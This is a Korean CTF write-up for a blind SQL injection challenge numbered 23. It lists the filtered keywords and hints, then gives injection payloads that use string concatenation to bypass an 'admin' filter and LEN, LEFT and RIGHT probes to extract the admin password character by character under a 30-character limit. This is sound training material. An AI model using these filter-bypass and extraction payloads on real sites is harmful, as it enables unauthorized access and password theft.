# 23

## Problem
```
id	
pw	
Hard Blind Sql Injection
Filtering Keywords
admin / select / Union / by / having / substring
from / char / delay / 0x / hex / asc / desc ..........
```

## Inspection
* 주석 힌트가 있다.
	- `<!-- Hint 1 : guest / guest & Your goal is to find the admin's pw -->`
    - `<!-- Hint 2 : Bypass 'admin' string -->`
* `guest`, `guest`로 로그인하면 `OK guest`라고 뜬다.
* 쿼리의 결과가 참이면 `OK {id}`, 거짓이면 `False`라고 뜨고, 필터링되는 게 있으면 `No hack`이라고 뜬다.
* 파라미터 하나에 넘기는 페이로드의 길이가 `30` 이상이면 `No hack`이라고 뜬다.

## Solution
* 쿼리를 `SELECT id FROM ??? WHERE id='"&id&"' and pw='"&pw&"'`로 가정한다.
* [`chal23_blind_sqli.py`](./chal23_blind_sqli.py)
    - `id=admin`의 `pw`의 길이를 알아낸다.    
        + `?id=ad'+'min' and len(pw)={x}--&pw=1234`
        + String Concatenation으로 필터링을 우회할 수 있다. 하지만 이는 페이로드의 길이가 늘어나서 필터링될 위험이 크다.
        + 함수로 `LEN()`을 사용한다.
    - `OK admin`이라고 뜨는 `pw` 왼쪽 첫 글자를 알아낸다.
        + `?id=ad'+'min' and left(pw,1)='{c}'--&pw=1234`
        + 함수로 `LEFT()`를 사용한다.
    - 페이로드 길이에 유의하며 `pw`의 왼쪽 반을 알아낸다.
        + `?id=' or left(pw,{x})='{s}'--&pw=1234`
        + `x`를 증가시키면서 `s`도 오른쪽에 한 글자씩 붙여나간다.
        + 함수로 `LEFT()`를 사용한다.
    - `OK admin`이라고 뜨는 `pw`의 오른쪽 첫 글자를 알아낸다.
        + `?id=' or right(pw,1)='{c}'--&pw=1234`
        + 함수로 `RIGHT()`를 사용한다.
    - 페이로드 길이에 유의하며 `pw`의 오른쪽 반을 알아낸다.
        + `?id=' or right(pw,{x})='{s}'--&pw=1234`
        + `x`를 증가시키면서 `s`도 왼쪽에 한 글자씩 붙여나간다.
        + 함수로 `RIGHT()`를 사용한다.
    - 알아낸 `pw`를 소문자로 바꾼다. Auth 목적.